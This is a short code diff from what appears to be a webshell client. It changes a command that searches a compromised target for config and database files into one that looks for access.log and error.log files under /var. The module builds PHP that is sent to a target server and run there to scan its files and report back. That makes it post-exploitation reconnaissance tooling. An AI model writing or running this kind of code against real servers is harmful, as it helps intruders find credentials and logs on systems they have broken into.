@@ -1,10 +1,10 @@
-from libs.config import alias, gget
+from libs.config import alias
 from libs.myapp import send, color, print_tree
 from json import JSONDecodeError
 
 
 def get_php(file_path: str):
-    return """$cfgs=array("cfg","config","db","database");
+    return """$cfgs=array("access.log","error.log");
 function filter($v,$vv){
     return strstr($v, $vv);
 }
@@ -28,15 +28,14 @@ print(json_encode(scan_rescursive("%s")));""" % file_path
 
 
 @alias(True, fp="web_file_path")
-def run(web_file_path: str = ""):
+def run(web_file_path: str = "/var"):
     """
-    fc
+    fl
 
-    Search config file from target system.
+    Search log file (access.log,error.log) from target system.
 
-    eg: fc {web_file_path=webroot}
+    eg: fl {web_file_path="/var"}
     """
-    web_file_path = web_file_path if (len(web_file_path)) else gget("webshell.root", "webshell")
     php = get_php(web_file_path)
     try:
         res = send(php)
